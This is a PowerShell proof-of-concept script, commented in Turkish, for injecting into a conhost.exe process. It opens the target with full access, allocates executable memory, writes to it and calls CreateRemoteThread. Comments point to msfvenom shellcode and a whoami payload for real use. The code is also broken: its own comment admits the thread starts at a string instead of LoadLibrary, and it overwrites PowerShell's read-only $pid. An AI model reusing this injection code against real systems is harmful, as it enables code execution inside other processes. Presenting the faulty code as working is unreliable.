# PoC: Conhost.exe PID üzerinden basit process injection (calc.exe popup)
# Sadece test/lab ortamında kullanın!

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hThread, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
}
"@

# Hedef PID'yi kullanıcıdan al
$pid = Read-Host -Prompt "Hedef conhost.exe PID'sini girin (örneğin Process Explorer'dan bakın)"

# calc.exe için shellcode yerine LoadLibrary ile kernel32!LoadLibraryA kullanarak basit yol
$calcPath = "C:\Windows\System32\calc.exe" + "`0"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($calcPath)

$processHandle = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, [uint32]$pid)
if ($processHandle -eq [IntPtr]::Zero) {
    Write-Host "Process açılamadı. Yetki yetersiz veya PID hatalı." -ForegroundColor Red
    exit
}

$alloc = [Win32]::VirtualAllocEx($processHandle, [IntPtr]::Zero, [uint32]$bytes.Length, [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_EXECUTE_READWRITE)
if ($alloc -eq [IntPtr]::Zero) {
    Write-Host "Memory allocation failed." -ForegroundColor Red
    exit
}

$written = [UIntPtr]::Zero
[Win32]::WriteProcessMemory($processHandle, $alloc, $bytes, [uint32]$bytes.Length, [ref]$written)

# kernel32.dll zaten yüklü, LoadLibraryA adresini al
$loadLibAddr = (Get-Process -Id $pid).Modules | Where-Object {$_.ModuleName -eq "kernel32.dll"} | Select-Object -ExpandProperty BaseAddress
# Daha doğru: GetProcAddress ile LoadLibraryW al
# Ama basitlik için doğrudan CreateRemoteThread ile kernel32!CreateProcessW de kullanılabilir, burada LoadLibrary ile calc yükleyelim

# Gerçek PoC'te LoadLibraryW adresini dinamik almak daha iyi, ama basit tutalım:
$kernel32 = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -like "*kernel32.dll" }
# Daha pratik: msfvenom ile hazır shellcode kullanmak daha yaygın, ama burada zararsız tutalım.

Write-Host "Bu PoC sadece teorik olarak calc.exe açmayı dener. Gerçek enjeksiyonda shellcode gerekir." -ForegroundColor Yellow
Write-Host "Test için calc.exe popup bekleniyor..."

$thread = [Win32]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)  # Yanlış: LoadLibrary adresi lazım

# Doğru versiyon için küçük düzeltme: Gerçek PoC'lerde shellcode ile cmd.exe /c whoami > c:\test.txt gibi yapılır.

Write-Host "Basit PoC tamamlandı. Gerçek zararlı kullanım için shellcode gerekir ve tespit edilir." -ForegroundColor Cyan

[Win32]::CloseHandle($processHandle)
